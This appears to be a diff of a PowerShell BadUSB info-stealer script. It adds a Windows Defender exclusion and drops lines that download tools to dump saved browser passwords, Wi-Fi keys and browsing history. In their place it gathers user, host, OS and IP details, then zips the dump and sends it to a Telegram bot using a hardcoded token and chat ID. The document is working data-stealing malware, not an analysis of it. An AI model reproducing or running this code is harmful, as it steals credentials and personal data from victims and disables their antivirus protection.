@@ -9,25 +9,25 @@ Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Add-MpPreference -ExclusionPath $basePath -Force
 
-# Download necessary tools
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+#Extract data
+try {
+    $userName = $env:USERNAME
+    $computerName = $env:COMPUTERNAME
+    $dateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $osVersion = (Get-CimInstance Win32_OperatingSystem).Caption
+    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|Teredo' } | Select-Object -First 1).IPAddress
 
+    $sysInfo = @"
+User Name: $userName
+Computer Name: $computerName
+Date/Time: $dateTime
+OS Version: $osVersion
+IP Address: $ipAddress
+"@
 
-# Execute tools to gather data
-.\WNetWatcher.exe /stext connected_devices.txt
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
-.\WebBrowserPassView.exe /stext passwords.txt
-.\WirelessKeyView.exe /stext wifi.txt
+    $sysInfo | Out-File -FilePath "$dumpFolder\system_info.txt" -Encoding UTF8
+} catch {}
 
-# Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
-    Start-Sleep -Seconds 1
-}
-
-Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
@@ -40,7 +40,7 @@ while (!(Test-Path "$dumpFile")) {
 # Telegram configuration
 $token = "8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o"
 $chatID = "7398435102"
-$uri = "https://api.telegram.org/bot$token/sendDocument"
+$uri = "https://api.telegram.org/bot8392772771:AAFgffIbtVeD4xBpg0rzlGSfPsbW0GG-a0o/sendDocument"
 $caption = "Here are exfiltrated informations from $env:USERNAME"
 
 # Check if the file exists before sending
